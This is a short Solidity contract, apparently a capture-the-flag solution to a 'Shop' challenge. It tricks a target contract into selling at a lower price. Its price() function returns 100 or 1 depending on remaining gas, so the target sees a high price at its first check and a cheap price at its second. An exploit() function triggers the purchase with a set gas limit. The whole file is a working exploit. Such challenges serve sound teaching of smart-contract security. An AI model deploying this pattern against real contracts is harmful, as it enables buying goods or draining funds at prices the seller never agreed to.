// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface Shop {
    function buy() external;
}

/**
 * @title Discount
 * @dev Use interface to return the price asked the first time and a cheaper price the second time (without altering the state of the contract as the 'view' modifier expect)
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract Discount {
    function price() public view returns (uint256){
        if (gasleft() > 20000) // This value has to be set according to the amount of gas sent initially (works for 50_000)
            return 100;
        else
            return 1;
    }

    function exploit(address _contract, uint256 _gas) public {
        Shop(_contract).buy{gas: _gas}();
    }
}